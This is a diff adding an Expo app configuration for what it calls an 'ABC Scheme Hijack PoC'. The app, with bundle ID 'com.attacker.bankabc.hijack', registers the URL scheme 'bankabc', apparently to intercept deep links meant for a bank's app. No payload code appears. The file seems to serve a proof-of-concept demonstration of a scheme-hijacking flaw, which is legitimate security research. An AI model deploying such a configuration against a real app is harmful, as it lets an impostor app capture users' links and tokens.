@@ -1,0 +1,51 @@
+{
+  "expo": {
+    "name": "ABC Scheme Hijack PoC",
+    "slug": "abc-scheme-hijack-poc",
+    "version": "1.0.0",
+    "orientation": "portrait",
+    "icon": "./assets/icon.png",
+    "scheme": "bankabc",
+    "userInterfaceStyle": "light",
+    "splash": {
+      "image": "./assets/splash.png",
+      "resizeMode": "contain",
+      "backgroundColor": "#009966"
+    },
+    "assetBundlePatterns": [
+      "**/*"
+    ],
+    "ios": {
+      "supportsTablet": true,
+      "bundleIdentifier": "com.attacker.bankabc.hijack",
+      "infoPlist": {
+        "CFBundleURLTypes": [
+          {
+            "CFBundleURLName": "com.attacker.bankabc.hijack",
+            "CFBundleURLSchemes": ["bankabc"]
+          }
+        ],
+        "LSApplicationQueriesSchemes": ["bankabc"],
+        "UILaunchScreen": {
+          "backgroundColor": "#009966"
+        },
+        "ITSAppUsesNonExemptEncryption": false
+      }
+    },
+    "android": {
+      "adaptiveIcon": {
+        "foregroundImage": "./assets/adaptive-icon.png",
+        "backgroundColor": "#009966"
+      }
+    },
+    "web": {
+      "favicon": "./assets/favicon.png"
+    },
+    "extra": {
+      "eas": {
+        "projectId": "259b3805-6ea4-4a73-b08f-87f630c5a099"
+      }
+    },
+    "owner": "huahua123"
+  }
+}
